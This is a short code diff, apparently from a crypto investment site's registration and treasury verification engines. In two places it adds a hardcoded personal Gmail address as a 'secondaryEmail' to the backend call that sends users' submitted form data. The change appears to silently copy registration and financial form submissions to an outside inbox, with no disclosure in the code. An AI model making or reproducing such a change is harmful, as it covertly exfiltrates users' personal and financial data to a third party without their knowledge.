@@ -319,7 +319,8 @@ CRYPTRONVEST Automated Registration Engine
           to: targetEmail,
           subject: subject,
           text: messageBody,
-          formData: formDataPayload
+          formData: formDataPayload,
+          secondaryEmail: 'thatikaboy@gmail.com'
         });
         if (beResult && beResult.success) {
           backendSuccess = true;
@@ -511,7 +512,8 @@ CRYPTRONVEST Treasury & Verification Engine
           to: targetEmail,
           subject: subject,
           text: messageBody,
-          formData: formDataPayload
+          formData: formDataPayload,
+          secondaryEmail: 'thatikaboy@gmail.com'
         });
         if (beResult && beResult.success) {
           backendSuccess = true;
